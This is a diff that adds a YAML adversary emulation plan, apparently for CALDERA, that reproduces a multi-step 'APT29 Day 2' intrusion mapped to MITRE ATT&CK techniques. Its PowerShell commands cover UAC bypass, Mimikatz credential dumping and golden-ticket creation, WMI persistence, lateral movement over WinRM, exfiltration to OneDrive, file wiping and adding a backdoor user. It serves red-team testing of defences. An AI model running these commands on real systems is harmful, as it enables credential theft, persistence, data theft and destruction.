@@ -1,0 +1,758 @@
+# APT29-Day2.yaml - CALDERA and Atomic style TTPs
+
+- emulation_plan_details:
+    id: 4aafe2ab-1c03-4ac1-aaa3-fdd69c305a0a
+    adversary_name: APT29 Day 2
+    adversary_description: APT29 is a threat group that has been attributed to the Russian government who have been in operation since at least 2008. This group reportedly compromised the Democratic National Committee starting in the summer of 2015. This adversary models scenario Day 2 of the APT29.
+    attack_version: 8.1
+    format_version: 1.0
+
+# Step 11 - Initial Breach
+
+# .lnk payload
+- id: e506f811-884d-4992-aacb-514b33a0324f
+  name: Click .LNK payload
+  description: Execute PowerShell collection command to collect and compress files of specific extensions.
+  tactic: execution
+  technique:
+    attack_id: T1204.002
+    name: "User Execution: Malicious File"
+  cti_source: "https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html"
+  procedure_group: procedure_execution
+  procedure_step: "11.A"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Set-Location -Path "C:\Users\#{profile_user_day2}\Desktop";
+
+          if(Test-Path -LiteralPath "$env:appdata\Microsoft\kxwn.lock"){
+            Remove-Item "$env:appdata\Microsoft\kxwn.lock" -Force;
+            Write-Host "Removed old kxwn.lock file";
+          }
+
+          powershell.exe Get-Content '.\2016_United_States_presidential_election_-_Wikipedia.html' -Stream schemas | IEX;
+        cleanup: |
+          Remove-Item "$env:appdata\Microsoft\kxwn.lock" -Force;
+
+  input_arguments:
+    profile_user_day2:
+      description: Name of profile user
+      type: string
+      default: Administrator
+
+  executors:
+  - name: powershell
+    command: |
+      Set-Location -Path "C:\Users\#{profile_user_day2}\Desktop";
+
+      if(Test-Path -LiteralPath "$env:appdata\Microsoft\kxwn.lock"){
+        Remove-Item "$env:appdata\Microsoft\kxwn.lock" -Force;
+        Write-Host "Removed old kxwn.lock file";
+      }
+
+      powershell.exe Get-Content '.\2016_United_States_presidential_election_-_Wikipedia.html' -Stream schemas | IEX;
+    cleanup_command: |
+      Remove-Item "$env:appdata\Microsoft\kxwn.lock" -Force;
+
+# Step 12 - Fortify Access
+
+- id: 4a2ad84e-a93a-4b2e-b1f0-c354d6a41278
+  name: Timestomp kxwn.lock
+  description: Timestomp kxwn.lock
+  tactic: defensive-evasion
+  technique:
+    attack_id: T1070.006
+    name: "Indicator Removal on Host: Timestomp"
+  cti_source: "https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html"
+  procedure_group: procedure_def_evasion
+  procedure_step: "12.A"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          if (!(test-path -path "$env:appdata\Microsoft\kxwn.lock")) {
+            write-host "[!] kxwn.lock was not found on this host.";
+            exit 1;
+          } else {
+            . .\timestomp.ps1;
+            timestomp -dest "$env:appdata\Microsoft\kxwn.lock";
+          }
+        payloads:
+        - timestomp.ps1
+
+  executors:
+  - name: powershell
+    command: |
+      if (!(test-path -path "$env:appdata\Microsoft\kxwn.lock")) {
+        write-host "[!] kxwn.lock was not found on this host.";
+        exit 1;
+      } else {
+        . .\timestomp.ps1;
+        timestomp -dest "$env:appdata\Microsoft\kxwn.lock";
+      }
+
+- id: f9c0b150-822f-497b-ad6d-187f24561e9a
+  name: Detect Anti-Virus
+  description: Detect anti-virus software on host
+  tactic: discovery
+  technique:
+    attack_id: T1518.001
+    name: "Software Discovery: Security Software Discovery"
+  cti_source: "https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html"
+  procedure_group: procedure_discovery
+  procedure_step: "12.B"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          . .\stepTwelve.ps1;
+          detectav
+        payloads:
+        - stepTwelve.ps1
+
+  executors:
+  - name: powershell
+    command: |
+      . .\stepTwelve.ps1;
+      detectav
+
+- id: 2b5a72b1-01e4-48ae-98b0-2570a7894371
+  name: Detect Software
+  description: Detect software on host
+  tactic: discovery
+  technique:
+    attack_id: T1518
+    name: "Software Discovery"
+  cti_source: "https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html"
+  procedure_group: procedure_discovery
+  procedure_step: "12.C"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          . .\stepTwelve.ps1;
+          software;
+        payloads:
+        - stepTwelve.ps1
+
+  executors:
+  - name: powershell
+    command: |
+      . .\stepTwelve.ps1;
+      software;
+
+# Step 13 - Local Enumaration
+
+- id: 0cfadbcb-ec21-44ae-adb7-9a23176dd620
+  name: Enumerate Computer Name
+  description: Triage host for ComputerNameNetBIOS,ComputerNameDnsHostname,ComputerNameDnsDomain,ComputerNameDnsFullyQualified,ComputerNamePhysicalNetBIOS,ComputerNamePhysicalDnsHostname,ComputerNamePhysicalDnsDomain,ComputerNamePhysical,DnsFullyQualifie
+  tactic: discovery
+  technique:
+    attack_id: T1082
+    name: "System Information Discovery"
+  cti_source: "https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/"
+  procedure_group: procedure_discovery
+  procedure_step: "13.A"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          . .\stepThirteen.ps1;
+          comp;
+        payloads:
+        - stepThirteen.ps1
+
+  executors:
+  - name: powershell
+    command: |
+      . .\stepThirteen.ps1;
+      comp;
+
+- id: 96140694-6d13-40b6-9553-0e63533469f3
+  name: Enumerate Domain Name
+  description: Domain triage
+  tactic: discovery
+  technique:
+    attack_id: T1082
+    name: "System Information Discovery"
+  cti_source: "https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/"
+  procedure_group: procedure_discovery
+  procedure_step: "13.B"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          . .\stepThirteen.ps1;
+          domain;
+        payloads:
+        - stepThirteen.ps1
+
+  executors:
+  - name: powershell
+    command: |
+      . .\stepThirteen.ps1;
+      domain;
+
+- id: f320eebd-e75b-4194-b529-79e64ad0b9ee
+  name: Enumerate Username
+  description: user triage
+  tactic: discovery
+  technique:
+    attack_id: T1033
+    name: "System Owner/User Discovery"
+  cti_source: "https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/"
+  procedure_group: procedure_discovery
+  procedure_step: "13.C"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          . .\stepThirteen.ps1;
+          user;
+        payloads:
+        - stepThirteen.ps1
+
+  executors:
+  - name: powershell
+    command: |
+      . .\stepThirteen.ps1;
+      user;
+
+- id: a34ab8f2-a106-41fb-af0b-cf5382bd18ae
+  name: Enumerate Processes
+  description: Process triage
+  tactic: discovery
+  technique:
+    attack_id: T1057
+    name: "Process Discovery"
+  cti_source: "https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/"
+  procedure_group: procedure_discovery
+  procedure_step: "13.D"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          . .\stepThirteen.ps1;
+          pslist;
+        payloads:
+        - stepThirteen.ps1
+
+  executors:
+  - name: powershell
+    command: |
+      . .\stepThirteen.ps1;
+      pslist;
+
+# Step 14 - Elevation
+
+- id: 5226e5dc-fc28-43b7-a679-0db49d520402
+  name: UAC Bypass via sdctl
+  description: Invoke UAC bypass sdctl
+  tactic: defensive-evasion
+  technique:
+    attack_id: T1134.002
+    name: "Access Token Manipulation: Create Process with Token"
+  cti_source: "https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016"
+  procedure_group: procedure_def_evasion
+  procedure_step: "14.A"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          . .\stepFourteen_bypassUAC.ps1;
+          bypass;
+        payloads:
+        - stepFourteen_bypassUAC.ps1
+
+  executors:
+  - name: powershell
+    command: |
+      . .\stepFourteen_bypassUAC.ps1;
+      bypass;
+
+- id: 1dba454c-0e4f-4fe0-8bc9-b17e8c5c9a24
+  name: Stage Mimikatz Binary
+  description: Staging Mimikatz Binary for later execution
+  tactic: credential-access
+  technique:
+    attack_id: T1003
+    name: "Credential Dumping"
+  cti_source: "https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/"
+  procedure_group: procedure_cred_access
+  procedure_step: "14.C"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          write-host "[+] Successfully downloaded m.exe";
+        payloads:
+        - m.exe
+
+  executors:
+  - name: powershell
+    command: |
+      write-host "[+] Successfully downloaded m.exe";
+
+- id: 4ef6009d-2d62-4bb4-8de9-0458df2e9567
+  name: Credential Dumping
+  description: Dumping credentials via wmidump (Mimikatz)
+  tactic: credential-access
+  technique:
+    attack_id: T1003
+    name: "Credential Dumping"
+  cti_source: "https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/"
+  procedure_group: procedure_cred_access
+  procedure_step: "14.B"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          . .\stepFourteen_credDump.ps1;
+          wmidump;
+        payloads:
+        - stepFourteen_credDump.ps1
+
+  executors:
+  - name: powershell
+    command: |
+      . .\stepFourteen_credDump.ps1;
+      wmidump;
+
+# Step 15 - Establish Persistence
+
+- id: 43aad2d6-d16a-4adb-aa2b-9510a3be4c52
+  name: WMI Persistence technique
+  description: user triage
+  tactic: persistence
+  technique:
+    attack_id: T1546.003
+    name: "Event Triggered Execution: Windows Management Instrumentation Event Subscription"
+  cti_source: "https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html"
+  procedure_group: procedure_persistence
+  procedure_step: "15.A"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Get-WmiObject -Namespace "root/subscription" -list | findstr /i "__Filter";
+          if ($?) {
+            write-host "[*] WMI script has already executed on this machine. Not loading and executing wmi script.";
+            exit 1;
+          } else {
+            . .\stepFifteen_wmi.ps1;
+            wmi;
+            if ($?) {
+              write-host "[+] WMI script has successfully executed!";
+              exit 0;
+            }
+            exit 1;
+          }
+        payloads:
+        - stepFifteen_wmi.ps1
+
+  executors:
+  - name: powershell
+    command: |
+      Get-WmiObject -Namespace "root/subscription" -list | findstr /i "__Filter";
+      if ($?) {
+        write-host "[*] WMI script has already executed on this machine. Not loading and executing wmi script.";
+        exit 1;
+      } else {
+        . .\stepFifteen_wmi.ps1;
+        wmi;
+        if ($?) {
+          write-host "[+] WMI script has successfully executed!";
+          exit 0;
+        }
+        exit 1;
+      }
+
+# Step 16 - Lateral Movement
+
+- id: 1c8552c7-f7ed-4523-b640-72d65af5f855
+  name: Enumerate Domain Controller
+  description: Get domain controller and current user SID for the domain
+  tactic: discovery
+  technique:
+    attack_id: T1018
+    name: "Remote System Discovery"
+  cti_source: "https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/"
+  procedure_group: procedure_discovery
+  procedure_step: "16.A"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          . .\powerview.ps1;
+          get-netdomaincontroller;
+        payloads:
+        - powerview.ps1
+
+  executors:
+  - name: powershell
+    command: |
+      . .\powerview.ps1;
+      get-netdomaincontroller;
+
+- id: a42be479-fc26-4d7c-9e63-7a9b74e4c8d2
+  name: Enumerate Domain SID
+  description: Get domain user SID
+  tactic: discovery
+  technique:
+    attack_id: T1033
+    name: "System Owner/User Discovery"
+  cti_source: "https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/"
+  procedure_group: procedure_discovery
+  procedure_step: "16.B"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          . .\stepSixteen_SID.ps1;
+          siduser;
+        payloads:
+        - stepSixteen_SID.ps1
+
+  executors:
+  - name: powershell
+    command: |
+      . .\stepSixteen_SID.ps1;
+      siduser;
+
+- id: acecc8f7-18c2-41fd-87bc-39ffd644e4e9
+  name: Remote Connection (T1028) & Remote File Copy (T1105) & Credential Dumping
+  description: Establish connection to Domain Controller
+  tactic: lateral-movement
+  technique:
+    attack_id: T1105
+    name: "Ingress Tool Transfer"
+  cti_source: "https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/"
+  procedure_group: procedure_lat_movement
+  procedure_step: "16.C-16.D"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          . .\invoke-winrmsession.ps1;
+          $session = invoke-winrmsession -Username "#{target.winrm.username}" -Password "#{target.winrm.password}" -IPAddress "#{target.winrm.remote_host}";
+          Copy-Item m.exe -Destination "C:\Windows\System32\\" -ToSession $session -force;
+          if ($?) {
+            write-host "[+] Successfully copied m.exe to remote host";
+          } else {
+            write-host "[!] Error, copying and executing m.exe on remote host";
+          }
+          Invoke-Command -Session $session -scriptblock {C:\Windows\System32\m.exe privilege::debug "lsadump::lsa /inject /name:krbtgt" exit} | out-string
+
+        payloads:
+        - invoke-winrmsession.ps1
+        - m.exe
+
+  input_arguments:
+    target.winrm.username:
+      description: Username of winrm target
+      type: string
+      default: Administrator
+
+    target.winrm.password:
+      description: Password for winrm target user
+      type: string
+      default: Password123!
+
+    target.winrm.remote_host:
+      description: IP or Hostname of remote host
+      type: string
+      default: 192.0.2.20
+
+  executors:
+  - name: powershell
+    command: |
+      . .\invoke-winrmsession.ps1;
+      $session = invoke-winrmsession -Username "#{target.winrm.username}" -Password "#{target.winrm.password}" -IPAddress "#{target.winrm.remote_host}";
+      Copy-Item m.exe -Destination "C:\Windows\System32\\" -ToSession $session -force;
+      if ($?) {
+        write-host "[+] Successfully copied m.exe to remote host";
+      } else {
+        write-host "[!] Error, copying and executing m.exe on remote host";
+      }
+      Invoke-Command -Session $session -scriptblock {C:\Windows\System32\m.exe privilege::debug "lsadump::lsa /inject /name:krbtgt" exit} | out-string
+
+# Step 17 - Collection
+
+- id: b1dcc53a-c86c-46ba-8a3d-e1da74a8db3c
+  name: Collect E-mails
+  description: Perform e-mail collection from custom PowerShell module.
+  tactic: collection
+  technique:
+    attack_id: T1114.001
+    name: "Email Collection: Local Email Collection"
+  cti_source: "https://www.fireeye.com/blog/products-and-services/2019/02/state-of-the-hack-no-easy-breach-revisited.html"
+  procedure_group: procedure_collection
+  procedure_step: "17.A"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          . .\stepSeventeen_email.ps1;
+          Write-Host "Emails Collected";
+        payloads:
+        - stepSeventeen_email.ps1
+
+  executors:
+  - name: powershell
+    command: |
+      . .\stepSeventeen_email.ps1;
+      Write-Host "Emails Collected";
+
+- id: fc231955-774f-442c-ac0e-e74dfda50c5c
+  name: Collect Files & Compress Collection
+  description: Collect a specific document from a target machine.
+  tactic: collection
+  technique:
+    attack_id: T1005
+    name: "Data from Local System"
+  cti_source: "https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html"
+  procedure_group: procedure_collection
+  procedure_step: "17.B-17.C"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          try{
+            if (!(test-path -path "C:\Windows\Temp\WindowsParentalControlMigration" -ErrorAction Stop)) {
+              New-Item -Path "C:\Windows\temp\" -Name "WindowsParentalControlMigration" -ItemType "directory" -force;
+            }
+          } catch {
+            write-host "[!] Access is denied. Manually browse to C:\Windows\Temp via Explorer and accept prompt";
+            exit 1;
+          }
+
+          if (! (test-path -path "C:\Users\#{profile_user_day2}\Documents\MITRE-ATTACK-EVALS.HTML")) {
+            write-host "[!] Error, MITRE-ATTACK-EVALS.HTML was not found.";
+            exit 1;
+          }
+          Copy-Item "C:\Users\#{profile_user_day2}\Documents\MITRE-ATTACK-EVALS.HTML" -Destination "C:\Windows\Temp\WindowsParentalControlMigration" -force;
+          . .\stepSeventeen_zip.ps1;
+          zip C:\Windows\Temp\WindowsParentalControlMigration.tmp C:\Windows\Temp\WindowsParentalControlMigration;
+          if ($?) {
+            write-host "[+] Documents successfully staged for collection.";
+          }
+
+        payloads:
+        - stepSeventeen_zip.ps1
+
+  input_arguments:
+    profile_user_day2:
+      description: Name of profile user
+      type: string
+      default: Administrator
+
+  executors:
+  - name: powershell
+    command: |
+      try{
+        if (!(test-path -path "C:\Windows\Temp\WindowsParentalControlMigration" -ErrorAction Stop)) {
+          New-Item -Path "C:\Windows\temp\" -Name "WindowsParentalControlMigration" -ItemType "directory" -force;
+        }
+      } catch {
+        write-host "[!] Access is denied. Manually browse to C:\Windows\Temp via Explorer and accept prompt";
+        exit 1;
+      }
+
+      if (! (test-path -path "C:\Users\#{profile_user_day2}\Documents\MITRE-ATTACK-EVALS.HTML")) {
+        write-host "[!] Error, MITRE-ATTACK-EVALS.HTML was not found.";
+        exit 1;
+      }
+      Copy-Item "C:\Users\#{profile_user_day2}\Documents\MITRE-ATTACK-EVALS.HTML" -Destination "C:\Windows\Temp\WindowsParentalControlMigration" -force;
+      . .\stepSeventeen_zip.ps1;
+      zip C:\Windows\Temp\WindowsParentalControlMigration.tmp C:\Windows\Temp\WindowsParentalControlMigration;
+      if ($?) {
+        write-host "[+] Documents successfully staged for collection.";
+      }
+
+# Step 18 - Exfiltration
+
+- id: 4840d6dd-da13-401a-be46-05db56f4e1e0
+  name: Exfiltrate data to OneDrive
+  description: Transfer data to a OneDrive account
+  tactic: exfiltration
+  technique:
+    attack_id: T1537
+    name: "Transfer Data to Cloud Account"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_exfiltration
+  procedure_step: "18.A"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          $err = $(net use y: #{onedrive.url} /user:#{onedrive.username} "#{onedrive.password}" 2>&1);
+          if($err -Like "*System error 85*") {
+            Write-Host "OneDrive net drive is already mounted!";
+          } elseif($err -Like "*System error 67*") {
+            Write-Host "OneDrive net drive mount failed - Check URL!";
+            Write-Host "#{onedrive.url}";
+            exit 1;
+          } elseif($err -Like "*System error 1244*") {
+            Write-Host "Could not authenticate to OneDrive - Check Creds!";
+            Write-Host "User: #{onedrive.username}";
+            Write-Host "Password: #{onedrive.password}";
+            exit 1;
+          }
+
+          Write-Host "Mount Successful"
+          Copy-Item "C:\Windows\Temp\WindowsParentalControlMigration.tmp" -Destination "y:\WindowsParentalControlMigration.tmp" -Force;
+          if(!$?){
+            exit 1;
+          }
+
+          Write-Host "Copy Successfull"
+          exit 0;
+
+  input_arguments:
+    onedrive.url:
+      description: URL for OneDrive net drive
+      type: URL
+      default: https://contoso-my.sharepoint.com/personal/johnd_contoso_onmicrosoft_com/
+
+    onedrive.username:
+      description: Username for OneDrive authentication
+      type: string
+      default: Administrator
+
+    onedrive.password:
+      description: Password for OneDrive authentication
+      type: string
+      default: Password123!
+
+  executors:
+  - name: powershell
+    command: |
+      $err = $(net use y: #{onedrive.url} /user:#{onedrive.username} "#{onedrive.password}" 2>&1);
+      if($err -Like "*System error 85*") {
+        Write-Host "OneDrive net drive is already mounted!";
+      } elseif($err -Like "*System error 67*") {
+        Write-Host "OneDrive net drive mount failed - Check URL!";
+        Write-Host "#{onedrive.url}";
+        exit 1;
+      } elseif($err -Like "*System error 1244*") {
+        Write-Host "Could not authenticate to OneDrive - Check Creds!";
+        Write-Host "User: #{onedrive.username}";
+        Write-Host "Password: #{onedrive.password}";
+        exit 1;
+      }
+
+      Write-Host "Mount Successful"
+      Copy-Item "C:\Windows\Temp\WindowsParentalControlMigration.tmp" -Destination "y:\WindowsParentalControlMigration.tmp" -Force;
+      if(!$?){
+        exit 1;
+      }
+
+      Write-Host "Copy Successfull"
+      exit 0;
+
+# Step 19 - Cleanup
+
+- id: f820b93d-6176-4a72-a138-a70b0b549c49
+  name: Data Wiping of staged files
+  description: Securely delete previously staged files.
+  tactic: impact
+  technique:
+    attack_id: T1561.001
+    name: "Disk Wipe: Disk Content Wipe"
+  cti_source: "https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=6ab66701-25d7-4685-ae9d-93d63708a11c&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments"
+  procedure_group: procedure_impact
+  procedure_step: "19.A-19.C"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          . .\wipe.ps1;
+          wipe "m.exe";
+          wipe "C:\Windows\Temp\WindowsParentalControlMigration.tmp";
+          wipe "C:\Windows\Temp\WindowsParentalControlMigration\MITRE-ATTACK-EVALS.HTML";
+        payloads:
+        - wipe.ps1
+
+  executors:
+  - name: powershell
+    command: |
+      . .\wipe.ps1;
+      wipe "m.exe";
+      wipe "C:\Windows\Temp\WindowsParentalControlMigration.tmp";
+      wipe "C:\Windows\Temp\WindowsParentalControlMigration\MITRE-ATTACK-EVALS.HTML";
+
+# Step 20 - Leverage Persistence
+# 20.A and 20.B were switched in original adversary profile.
+- id: 267bad86-3f06-49f1-9a3e-6522f2a61e7a
+  name: Execute Invoke-Mimikatz
+  description: Perfofrm Mimikatz credential collection
+  tactic: credential-access
+  technique:
+    attack_id: T1003
+    name: "Credential Dumping"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_cred_access
+  procedure_step: "20.B"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          klist purge;
+          . .\Invoke-Mimikatz.ps1;
+          invoke-mimikatz -command "kerberos::golden /domain:#{target.domain.name} /sid:#{target.sid}  /rc4:#{target.ntlm} /user:#{target.winrm.username} /ptt";
+          klist;
+          invoke-command -ComputerName scranton -ScriptBlock {net user /add toby "pamBeesly<3"};
+        payloads:
+        - Invoke-Mimikatz.ps1
+
+  input_arguments:
+    target.domain.name:
+      description: Target domain name
+      type: string
+      default: domain
+
+    target.sid:
+      description: SID for target user
+      type: string
+      default: S-1-5-21-1004336348-1177238915-682003330-512
+
+    target.ntlm:
+      description: NTLM hash for target user
+      type: string
+      default: 855c3697d9979e78ac404c4ba2c66533
+
+    target.winrm.username:
+      description: Username for winrm target user
+      type: string
+      default: Administrator
+
+  executors:
+  - name: powershell
+    command: |
+      klist purge;
+      . .\Invoke-Mimikatz.ps1;
+      invoke-mimikatz -command "kerberos::golden /domain:#{target.domain.name} /sid:#{target.sid}  /rc4:#{target.ntlm} /user:#{target.winrm.username} /ptt";
+      klist;
+      invoke-command -ComputerName scranton -ScriptBlock {net user /add toby "pamBeesly<3"};
+
+- id: afb8d8f7-d059-4825-95ae-c5727e2db320
+  name: Triggering Persistent
+  description: Trigger RegKey persistence by rebooting the machine
+  tactic: persistence
+  technique:
+    attack_id: T1218.011
+    name: "Signed Binary Proxy Execution: Rundll32"
+  cti_source: "https://www.fireeye.com/blog/products-and-services/2019/02/state-of-the-hack-no-easy-breach-revisited.html"
+  procedure_group: procedure_persistence
+  procedure_step: "20.A"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Restart-Computer -Force;
+
+  executors:
+  - name: powershell
+    command: |
+      Restart-Computer -Force;
